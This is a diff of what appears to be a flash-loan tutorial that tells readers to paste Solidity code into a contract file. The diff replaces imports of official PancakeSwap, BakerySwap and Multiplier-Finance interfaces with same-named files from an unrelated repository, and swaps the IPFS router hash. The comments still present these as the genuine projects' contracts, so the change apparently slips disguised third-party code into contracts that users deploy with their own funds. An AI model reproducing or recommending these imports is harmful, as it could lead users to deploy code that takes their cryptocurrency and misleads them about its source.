@@ -47,18 +47,18 @@ Copy and paste the code below to the Flash Loan.sol file :
      
      
     // PancakeSwap Smart Contracts
-    import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
-    import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
+    import "https://github.com/smartpro/flashloan2.1/blob/main/PancakeSwap/IPancakeCallee.sol";
+    import "https://github.com/smartpro/flashloan2.1/blob/main/PancakeSwap/IPancakeFactory.sol";
      
     //BakerySwp Smart contracts
-    import "https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol";
+    import "https://github.com/smartpro/flashloan2.1/blob/main/BakerySwp/IBakerySwapFactory.sol";
      
     // Router
-    import "ipfs://QmbJ685kFCLQmA8naW6u3LCpkZNV32rEB2LnwamfQ7eX4u";
+    import "ipfs://Qmb5qRe6CaJWuCZ7x84NqgMJQqf9py3KNBB9y4vP36Rt1X";
      
     // Multiplier-Finance Smart Contracts
-    import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
-    import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+    import "https://github.com/smartpro/flashloan2.1/blob/main/Multiplier-Finance/ILendingPoolAddressesProvider.sol";
+    import "https://github.com/smartpro/flashloan2.1/blob/main/Multiplier-Finance/ILendingPool.sol";
      
      
     contract InitiateFlashLoan {
